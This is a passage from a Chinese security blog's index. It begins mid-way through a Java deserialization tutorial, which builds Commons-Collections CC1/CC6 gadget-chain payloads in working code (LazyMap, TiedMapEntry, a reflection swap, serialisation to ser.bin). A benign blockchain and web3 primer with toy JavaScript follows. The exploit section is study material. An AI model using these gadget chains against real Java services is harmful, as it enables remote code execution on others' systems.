AIHC.newInstance(Override.class,mapProxy);serialize(o);unserialize(\"ser.bin\");\n\n我们在实例化InvocationHandler时传入的第一个注解参数不需要再是Target，因为我们已经不再需要readObject中的setValue，而是直接在遍历map时利用memberValues.entrySet()。\nCC1的两条利用链:\n\nCommonsCollections6在jdk8u71中对CommonsCollections1做出了修复，主要是在AnnotationInvocationHandler.readObject中做出了修改，针对checkSetValue链中，readObject中整个移除了对checkSetValue的操作，针对LazyMap链则将memberValues设置为了客户端不可控，而是通过一个Filed类来进行读取。我们在实际进行反序列化的攻击时，如果使用CC1来攻击时，一旦jdk版本更改原有的gadgetchain就无法使用，这样对我们的攻击进行了极大的受限，那么有没有一个受jdk版本影响对的gadgetchain呢，我们来看CC6。\nysoserial中给出的gadgetchain，可以看到链子后半截直到LazyMap.get()和我们CC1的LazyMap链是一样的： \n\n再往上看我们发现触发点是HashMap.hash，这里和URLDNS中非常像了，通过向HashMapput一个键值对，那么在HashMap的readobject中就会对Map的键值对进行遍历，并且对每一个键值对的key进行hash，在进行hash时会对key进行hashCode。\n\n根据上面ysoserial给出的gadgetchain，我们发现所需要调用的hashCode的类就是TiedMapEntry，gadgetchain补充完之后就是这样了：\n\n我们来看这个TiedMapEntry，它的构造函数接收一个Map和一个key，也就是说这个类储存的键值对格式是 Map-key，（注意这里key只是一个名字，我们通常说的key-value一般来说是key在前，value在后，但key是否在前是不一定的，HashMap中以Key-value格式储存键值对，那么对于HashMap来说在前面的就是key，而TiedMapEntry以Map-key形式储存键值对，那么对它来说key就在后面）我们将lazymap扔到TiedMapEntry中：\nChainedTransformer ctf = getChain.getChainedTransformer();HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,ctf);TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,\"123\");\n\n再将tiedMapEntry作为键值储存到HashMap中：\nChainedTransformer ctf = getChain.getChainedTransformer();HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,ctf);TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,\"123\");HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;();hashMap.put(tiedMapEntry,\"123\");serialize(hashMap);\n\n但是这里依然有一个问题，如果运行一下上面的代码会发现我没有进行反序列化也弹出了计算器，这个问题我们在URLDNS中就遇到过，当序列化时，在我们puttiedMapEntry时就已经触发了hashCode，计算器就会弹出，并不是通过反序列化来触发的，所以我们要加一段代码防止在put时就弹计算器，我这里是在decorate时，传一个无效的Transformer，put时就不会弹计算器，在序列化前将factor通过反射修改回去，反序列化的结果就不会受到影响：\n        ChainedTransformer ctf = getChain.getChainedTransformer();        HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,new ConstantTransformer(1));        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,\"123\");        HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;();        hashMap.put(tiedMapEntry,\"123\");        lazyMap.remove(\"123\");        Class c = LazyMap.class;        Field factoryField = c.getDeclaredField(\"factory\");        factoryField.setAccessible(true);        factoryField.set(lazyMap,ctf);//      serialize(hashMap);\t\t\t\tunserialize(\"ser.bin\");\n","categories":["WebSec"],"tags":["Java反序列化"]},{"title":"区块链安全前置扫盲","url":"/2023/04/24/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%89%8D%E7%BD%AE%E6%89%AB%E7%9B%B2/","content":"web3.0安闻全知\n参考链接\n\n去中心化应用程序 Dapp 是什么？与 APP 有哪些区别？\nhttps://www.youtube.com/watch?v=YdWP-wJh9jA\n互联网发展的三个阶段web1.0静态页面，内容只能供用户去阅读，类似于在网络上读报纸或者看书。\nweb2.0动态互联网，实现用户之间的互动，比如twitter，facebook，titok等。\nweb2.0中厂商用免费或极低的成本吸引用户，通过获取到用户的信息来推流广告从而获得利润。\n打个比方就是 厂商在一片地上种了很多草，吸引羊来吃，趁着羊吃草的功夫把羊身上的毛薅下来拿去卖钱，而羊自己并不在意这些毛，可以说是一种双向互利的方式。\nweb3.0web3.0是一个很模糊的概念，随着区块链技术的发展，基于区块链的web3.0诞生。\n接着用上面的例子来说，随着web2.0的发展壮大，稀缺的不再是草，而是羊毛，也就是用户身上的数据。那么羊毛的重要性愈加突出，所以提出web3.0的概念，也就是拥有自己的一片空间，别人无论如何都无法修改，也就是将羊毛（数据）存放在了一个非常安全的地方中，相比于web2.0，不但实现了动态的交互，也实现了数据的“拥有”。\nweb3的概念非常模糊，可以说是一个大方向，按照我个人的理解可以说是在互联网创造了一个虚拟的世界，这个虚拟的世界拥有和现实世界一样的货币交易系统以及其他体系，能够自主维持运转的这样一个“虚拟生态系统”，而这个生态系统的生存法则就是“去中心化”。\n什么是去中心化？\n比如现在市面上的app都由一个厂家负责，厂商可以随意删除控制用户数据，形成了以厂商为中心的服务体系，去中心化就是没有中心厂商作为核心，而是所有用户形成一个能够自力更生的体系。\n密码货币随着web2.0发展，数字货币使用越来越多，而在区块链技术的支持下，数字货币也出现了全新的存在形式，去中心化的密码货币，世界上第一种密码货币就是比特币。像纸币有防伪印一样，密码货币通过密码学的散列计算出的hash值并且和智能合约进行绑定，密码货币基于去中心化的机制，与依赖中心监管体系的银行金融系统相对。之后出现的数种密码货币被创造，它们通常被称为altcoins。\n区块链程序员来讲讲什么是区块链 | 小白也能听懂的通俗解释 | 区块链原理 | 比特币 | 数字货币_哔哩哔哩_bilibili\n区块链的防篡改机制一个区块中储存了三样东西：数据，前一个区块的hash值，自身的hash值（由数据和前一区块的哈希值共同决定），如果要更改某一区块的内容，那么该区块（a区块）的hash值就会改变，下一区块（b区块）储存的a区块的hash值无法对应a区块当前哈希值，那么这两个区块间的链接就会断开。\n如果想要篡改某一区块的数据，我们就要将这一区块以及后续所有区块的hash值进行重算，比如一条区块链里面有abcde五个区块，当我们篡改了b区块的数据，那么我们就要带着b区块的新hash值和c区块的数据重新计算出c区块的新hash值，然后再带着c区块的新hash值和d区块的数据重新计算d区块的新hash值，再带着d区块的新hash值和e区块的数据重新计算e区块的hash值…………………..其实在重新计算某一区块的hash值的过程也就相当于创造了一个新的区块，因此篡改一个区块以及后续区块所需的时间取决于创造一个区块所需要的时间。\n这个看起来对算力要求似乎非常庞大，但是现代计算机其实是可以做到这一点的，如果我们有一台超大算力的计算机，那么是不是轻松就可以改变区块链的内容了？为了防止这种情况的出现，区块链加入了工作量证明机制（proof of work）简称 pow\n我们用游戏举例说明一下pow，我们刚才说到用超大算力计算机来篡改区块链，这就好比你拿着满级神装在新手村乱杀，区块链是不允许这种情况出现的，因此它会上调怪物属性，也就是会增加创造一个区块所需的难度，使每一新区块被创造时都保持在十分钟左右（当然这个时间是可以更改的），因此即使是一台超高算力的计算机想要篡改一个区块所需的时间仍然是是 \n创造一个区块的时间✖️n min。\n那我们所说的挖矿是什么呢？上面提到的情况是想要篡改区块中的数据，那么我没有恶意，我只是单纯的创造区块去给自己或者他人使用，这个创造区块的过程牺牲了我电脑的算力和一些其他资源，所以作为补偿，创建区块的人会得到密码货币的奖励，这就是我们所说的挖矿。\n区块链的点对点网络结构\n在传统的web服务中，传统的链接对象基本都是客户端和服务端，众多客户端访问一个服务端来进行交互，而在区块链的点对点网络结构（peer to peer）中，不再有客户端与服务端的概念，每一个节点间相互平等，并且包含完整的区块链数据存储，也就是说每一个节点中都储存了整个区块链网络中的所有信息，这样即使一个节点出现故障，其他所有节点也在帮他记录信息，这些记录了所有节点区块链的节点叫做全节点，当然也有只储存了自己信息的轻节点，比如区块链用来储存转账记录，那么每一节点都储存了所有节点之间的转账记录，每一节点储存的内容也是相同的，如果某一节点与其他节点出现差异，那么该节点或许就有被篡改过的可能了，但是被篡改几乎是不可能发生的，原因看下面。\n点对点网络结构下的所有节点拥有判断区块是否被篡改的能力，当一个新区块想要加入某一节点的区块链时，该节点会向其他所有节点进行广播，所有的节点进行判断，如果50%以上的节点都认为该区块没有被篡改，那么这个区块就可以成功的加入区块链当中，反言之如果想要篡改某一区块的数据，你首先要将这一区块后的所有哈希重新计算，并且还要更改超过百分之五十节点的这一区块后的所有区块的哈希，那么就要拥有超过全网50%以上的算力才可以，这付出的代价是相当高的，这就是区块链网络系统的少数服从多数原则。\nDAPPDapp 是什么？APP (Application) 指的是手机里的应用程序，像是微信、微博、抖音…等都是日常生活中常会使用到的 App。\n而 Dapp 的全名为去中心化应用程序（Decentralized Application），是建立在区块链系统网络上，所提供的服务都具有公开透明、不可篡改的特性。\n以下是 Dapp 所具有的要素：\n\n代码开源：程序代码皆公开透明，任何人都可以查阅及审核，避免项目方说到没做到。\n分布式帐本：降低数据遗失的风险，且没有任何其他第三方有权能够窜改数据。\n数据所有权：除本人（私钥持有者）外，任何人皆无法动用该帐号的数据。\n\n为什么 Dapp 会崛起?事实上，App 都是中心化的应用服务，用户所使用的数据都会存储在单一服务器系统里，代表公司能掌控用户的所有数据，但相关问题也随之浮出水面。\n数据所有权归属问题用户在 App 上的个人资料、搜索浏览纪录等信息都会存储在中心化系统的服务器里，这也意味着软件公司能够借由这些数据来营利。\n也导致像是微博、抖音等企业，能透过搜集的用户数据来投放广告，并借此获利。等于企业能用你的信息来赚钱，但你却分不到任何好处，甚至还可能受到影响（例如被疯狂投放广告、或个人资料被平台外泄）。\n另外，传统手游的游戏道具、帐号数据也都属于公司所有，一旦宣布停止营运，这些资产也会随着官方服务器关闭而消失。\n但在 Dapp 中，你的游戏道具、帐号都会以 NFT 形式储存在链上，因此只要区块链不倒，你就能持续拥有这些资产。换句话说，Dapp 能够让数据的所有权回归到用户身上。额外提醒，虽然你仍拥有这些资产，但可能会因为游戏已经关闭，导致这些资产的现值趋近于零，你能保有的仍以回忆居多。\n过度中心化App 是由中心化服务器来进行管理，因此企业有时可以专断独行，但用户却没有任何反制的手段：例如可以随意植入广告，或是删除用户的内容、帐号。\n而 Dapp 的数据都存在区块链上，因此项目方没办法任意删除用户资料，目前也没有任何广告植入的问题（但不确定未来是否会有项目开始植入广告）。\n由于上述几点原因，也让许多人开始对传统的 App 感到不满，于是就有人打算通过区块链“去中心化”的特性来研发能解决上述问题的 App，于是 Dapp 就此诞生。\n不过同时也要注意，不是每个 Dapp 都一定符合公开、去中心化的规范，例如 Opensea 就能下架用户的 NFT 和限制用户登陆。\nDapp 与 App 的差异App 的应用服务是使用中心化服务器，代表软件公司必须要承担存储用户的数据量的营运成本，否则将无法持续地运行。\n例如抖音服务器的成本就百万以上，因此必须想办法创造各种营收管道来支持各项支出，像是通过大数据将广告推广到潜在用户面前，借此吸引更多广告商进驻。\n而 Dapp 是建立在区块链上，用户在链上进行交易、换币等行为时，是需要自行负担手续费（Gas 费）的，也就代表开发商的运营成本会比传统 App 来得更低（不过有些开发商为了吸引用户，会帮用户负担使用时的手续费）。\n\n\n\n\nDapp\nApp\n\n\n\n服务器\n去中心化\n中心化\n\n\n隐私性\n有（区块链匿名性）\n无（还可能被外泄）\n\n\n营运成本\n用户共同负担（或开发商负担）\n开发商负担\n\n\n平台获利来源\n智能合约（链上手续费）\n广告商或用户消费\n\n\n数据所有权\n用户\n开发商\n\n\n平台控制权\n开发商或是 DAO 治理\n开发商\n\n\n系统\n区块链\nAndroid、iOS\n\n\n代码是否开源\n代码皆公开，可供人参考\n代码为公司机密，擅用者可能会吃上官司\n\n\n智能合约智能合约，是一段写在区块链上的代码，一旦某个事件触发合约中的条款，代码即自动执行。也就是说，满足条件就执行，不需要人为操控，类似于传统web的后端代码。\n简单区块链实现我们用Javascript来手写一个建议的区块链出来，其实和写一个链表很像：\nconst sha256 = require('crypto-js/sha256')Date = new Date()class block{    constructor(data,time,previousHash) {        this.data = data        this.time = time        this.previousHash = previousHash        this.myHash = this.currHash()    }    currHash() {        return sha256(this.data + this.time + this.previousHash).toString()    }}class blockCahin{    constructor()    {        this.chain = [this.createBlockchain()];    }    createBlockchain()    {        return new block(\"Genesisblock\",Date.toLocaleString(),0o0000000)    }    getLatestblock()    {        return this.chain[this.chain.length - 1]    }    addBlock(newBlock)    {        newBlock.previousHash = this.getLatestblock().myHash        newBlock.myHash = newBlock.currHash()        this.chain.push(newBlock)    }}BlockChain = new blockCahin()BlockChain.addBlock(new block(\"this is a test\",Date.toLocaleDateString(),\"anything\"))console.log(BlockChain)\n\n\n接下来我们用代码实现一下简易的POW：\nconst sha256 = require(\"crypto-js/sha256\")function proofOfwork(){    let seed = \"y1zh3e7\"    let x = 1               // x为自增变量    while (true){        if(sha256(seed + x).toString().substring(0,4) != \"0000\") // 定义难度，比如我现在要求通过不断自增x去计算seed+x的哈希值        {                                                        // 当哈希值前四位都为0000时则代表成功 如果想提高难度我们就可以让前x位为xxxx            x += 1        }else{            console.log(sha256(seed + x).toString())            break        }    }    console.log(x)                                              // 输出计算多少次后成功}proofOfwork()\n\n实现防篡改机制：\n/***********************************************验证区块链防篡改需要检测两项：                                     1.重新计算区块的hash值，判断与区块中储存的hash是否相同  2.判断当前区块的previousHash是否和上一区块的hash相同  ***********************************************/function validateBlock(validBlockchain){    if (validBlockchain.chain.length == 1)    {        if(validBlockchain.chain[0].myHash != validBlockchain.calcHash())        {            console.log(\"数据篡改\")            return false        }    }else {        for (let i=1; i&lt;=validBlockchain.chain.length-1; i++)        {            if(validBlockchain.chain[i].myHash != validBlockchain.chain[i].calcHash())            {                console.log(\"数据篡改\")                return false            }            if (validBlockchain.chain[i].previousHash != validBlockchain.chain[i-1].myHash)            {                console.log(\"前后区块链断裂\")                return false            }        }    }    console.log(\"数据无篡改且区块链结构完整\")    return true}\n\n将完整的POW整合到区块链当中并实现挖矿功能，最终实现的完整区块链：\nconst sha256 = require('crypto-js/sha256')Date = new Date()class block{    constructor(data,time,previousHash) {        this.data = data        this.time = time        this.nonce = 1        this.previousHash = previousHash        this.myHash = this.calcHash()    }    calcHash() {        return sha256(this.data + this.time + this.previousHash + this.nonce).toString()    }    /**  **/    getAnswer(difficulty){        let answer = \"\"        for(let i=0; i&lt;difficulty; i++)        {            answer += \"0\"        }        console.log(answer)        return answer    }   /** 引入挖矿功能 **/    mine(difficulty){        let answer = this.getAnswer(difficulty)        let Hash = this.calcHash()       while(true){            if (Hash.substring(0,difficulty) != answer)            {                this.nonce++                Hash = this.calcHash()            }else{                break            }       }       console.log(\"mine successful!\")       console.log(this.nonce)       return Hash    }}class blockCahin{    constructor()    {        this.chain = [this.createBlockchain()]        this.difficulty = 5    }    createBlockchain()    {        return new block(\"Genesisblock\",Date.toLocaleString(),0o0000000)    }    getLatestblock()    {        return this.chain[this.chain.length - 1]    }    addBlock(newBlock)    {        newBlock.previousHash = this.getLatestblock().myHash        newBlock.myHash = newBlock.mine(this.difficulty)        this.chain.push(newBlock)    }}/***********************************************验证区块链防篡改需要检测两项： 1.重新计算区块的hash值，判断与区块中储存的hash是否相同 2.判断当前区块的previousHash是否和上一区块的hash相同 ***********************************************/function validateBlock(validBlockchain){    if (validBlockchain.chain.length == 1)    {        if(validBlockchain.chain[0].myHash != validBlockchain.calcHash())        {            console.log(\"数据篡改\")            return false        }    }else {        for (let i=1; i&lt;=validBlockchain.chain.length-1; i++)        {            if(validBlockchain.chain[i].myHash != validBlockchain.chain[i].calcHash())            {                console.log(\"数据篡改\")                return false            }            if (validBlockchain.chain[i].previousHash != validBlockchain.chain[i-1].myHash)            {                console.log(\"前后区块链断裂\")                return false            }        }    }    console.log(\"数据无篡改且区块链结构完整\")    return true}BlockChain = new blockCahin()BlockChain.addBlock(new block(\"this is a test\",Date.toLocaleDateString(),\"anything\"))// console.log(BlockChain)// BlockChain.chain[1].data = \"数据篡改\"// BlockChain.chain[0].myHash = \"0012343566688\"// console.log(validateBlock(BlockChain))\n\n数字货币的简单实现比特币我们前面说到区块链是用来记录信息的，如果它记录的是转账记录那么它就成了一个账本。\n一笔转账信息需要以下四个信息：\n付款人 收款人 转账金额 转账时间\n我们前面提到了POW，比特币会通过POW将产生一个区块的时间控制在十分钟左右，比特币的工作机制基本如下：\n整个区块链是一个网状的网络结构，其中有一个中心，每十分钟发布一个问题（类似于我们之间生成的目标Hash），当问题发布后，该网状网络中的所有结点会来解这个问题（挖矿，爆破目标Hash值），此时就是各结点间的算力比拼，当有一个结点解出该问题后则代表挖矿成功，一个新区块被创造出来，这时该新区块内会自动生成一笔转账记录，其中的收款人就是该区块的挖出者，这时区块链就会自动把奖励发放到收款人的账户上，并且该区块会在整个区块链网络中进行广播，区块链中的每一个结点会对该区块进行验证其合法性，经过验证后该新区块就会被加到区块链上。每四年比特币的奖励会减半一次，最后的比特币总量大约是在2100万个左右。\n那么这里会有一个问题，如果过了几年之后，比特币越来越少，每次挖矿后几乎得不到比特币了，那还会有人来挖矿吗？\n其实比特币只是比特币区块链中的一个额外奖励机制，整个区块链货币依赖的是每一笔转账记录的手续费，当一个新区块被挖出时那么这个新区块的转账信息（我们刚才说到的比特币奖励机制）就会记录在这个新区块上（以转账的方式发放奖励货币），后续也会记录其他的转账信息，并且会产生手续费，手续费归记录该笔转账信息的区块的挖出者所有。\n说到动态调整难度，比特币是怎么调整的呢？\n比特币会在每2016个区块诞生后验证一下难度，如果说本来预期中mine这2016个区块所需要的时间是两个星期，而实际只用了一个星期，那么此时比特币区块链就会调整难度，使其达到预期，基本上比特币区块链会每两个星期调整一次难度。\n创建自己的数字货币首先我们要新建一个Transaction类来进行转账记录：\nclass Transaction{    constructor(from, to , amount) {        this.from = from        this.to = to        this.amount = amount    }}\n\n更改区块中data的含义，此时要记录的是转账信息transaction，并且由于transaction是一个对象，因此在参与计算哈希时要转为字符串（这里将时间改为了Date.now，这样在区块创造时就记录了这笔转账记录的时间）：\nclass Block{    constructor(transaction,previousHash) {        this.transactions = transaction        this.time = Date.now()        this.nonce = 1        this.previousHash = previousHash        this.myHash = this.calcHash()    }    // 计算hash时要将data转换为字符串类型，此时的data是一个transaction    calcHash() {        return sha256(JSON.stringify(this.transactions) + this.time + this.previousHash + this.nonce).toString()    }\n\n上面说到奖励货币的发放是通过转账的方式实现的，所以我们在链上实现逻辑：\nclass blockChain{    constructor()    {        this.chain = [this.createBlockchain()]        this.difficulty = 5        this.transactionPool = []  //挖矿成功的转账信息        this.mineReward = 50       //每次挖矿成功的奖励货币数    }mineTransaction(minerAddress)    {        const minerRewardTransaction =  new Transaction('', minerAddress, this.mineReward)        this.transactionPool.push(minerRewardTransaction)    }\n\n之前我们是在外部传入一个区块，在整个货币系统的实现后区块应该是在挖矿时在区块链内部产生的，修改代码：\n//将Transaction添加到Transaction Pool中    addTransaction(Transaction)    {        this.transactionPool.push(Transaction)    }\t\t\t\tmineTransaction(minerAddress)    {        const minerRewardTransaction =  new Transaction('', minerAddress, this.mineReward)        this.transactionPool.push(minerRewardTransaction)        //挖矿        /********************************************************         * 这里新区块记录了整个区块链的转账信息，但在实际情况中区块的存储         * 容量是有限制的，所以在挖矿时记录的转账记录会选择手续费最高的transaction         * 我们这里先不考虑这种情况         *******************************************************/        const newBlock = new Block(this.transactionPool,this.getLatestBlock().myHash)        newBlock.mine()        //添加到区块链，并清空Transaction Pool        this.chain.push(newBlock)        this.transactionPool = []    }\n\n整个写好的数字代币：\nconst sha256 = require('crypto-js/sha256')class Transaction{    constructor(from, to , amount) {        this.from = from        this.to = to        this.amount = amount    }}class Block{    constructor(transaction,previousHash) {        this.transactions = transaction        this.time = Date.now()        this.nonce = 1        this.previousHash = previousHash        this.myHash = this.calcHash()    }    // 计算hash时要将data转换为字符串类型，此时的data是一个transaction    calcHash() {        return sha256(JSON.stringify(this.transactions) + this.time + this.previousHash + this.nonce).toString()    }    /** 获取相应难度hash **/    getAnswer(difficulty){        let answer = \"\"        for(let i=0; i&lt;difficulty; i++)        {            answer += \"0\"        }        return answer    }   /** 引入挖矿功能 **/    mine(difficulty){        let answer = this.getAnswer(difficulty)        let Hash = this.calcHash()       while(true){            if (Hash.substring(0,difficulty) != answer)            {                this.nonce++                Hash = this.calcHash()            }else{                break            }       }       console.log(\"mine successful!\\n\")       console.log(\"计算\"+this.nonce+\"次后挖矿成功，answer为\"+Hash)       return Hash    }}class blockChain{    constructor()    {        this.chain = [this.createBlockchain()]        this.difficulty = 4        this.transactionPool = []  //挖矿成功的转账信息        this.mineReward = 50       //每次挖矿成功的奖励货币数    }    createBlockchain()    {        return new Block(\"Genesisblock\",null)    }    getLatestBlock()    {        return this.chain[this.chain.length - 1]    }    //将Transaction添加到Transaction Pool中    addTransaction(Transaction)    {        this.transactionPool.push(Transaction)    }    mineTransaction(minerAddress)    {        const minerRewardTransaction =  new Transaction('', minerAddress, this.mineReward)        this.transactionPool.push(minerRewardTransaction)        //挖矿        /********************************************************         * 这里新区块记录了整个区块链的转账信息，但在实际情况中区块的存储         * 容量是有限制的，所以在挖矿时记录的转账记录会选择手续费最高的transaction         * 我们这里先不考虑这种情况         *******************************************************/        const newBlock = new Block(this.transactionPool,this.getLatestBlock().myHash)        newBlock.mine(this.difficulty)        //添加到区块链，并清空Transaction Pool        this.chain.push(newBlock)        this.transactionPool = []    }}/***********************************************验证区块链防篡改需要检测两项： 1.重新计算区块的hash值，判断与区块中储存的hash是否相同 2.判断当前区块的previousHash是否和上一区块的hash相同 ***********************************************/function validateBlock(validBlockchain){    if (validBlockchain.chain.length == 1)    {        if(validBlockchain.chain[0].myHash != validBlockchain.calcHash())        {            console.log(\"数据篡改\")            return false        }    }else {        for (let i=1; i&lt;=validBlockchain.chain.length-1; i++)        {            if(validBlockchain.chain[i].myHash != validBlockchain.chain[i].calcHash())            {                console.log(\"数据篡改\")                return false            }            if (validBlockchain.chain[i].previousHash != validBlockchain.chain[i-1].myHash)            {                console.log(\"前后区块链断裂\")                return false            }        }    }    console.log(\"数据无篡改且区块链结构完整\")    return true}Y1Coin = new blockChain()const Transaction1 = new Transaction('add1', 'add2', 20)const Transaction2 = new Transaction('add1', 'add2', 5)Y1Coin.addTransaction(Transaction1)Y1Coin.addTransaction(Transaction2)Y1Coin.mineTransaction(\"add3\")console.log(Y1Coin)console.log(Y1Coin.chain[1].transactions)\n\n\n","categories":["区块链"],"tags":["web3.0"]}]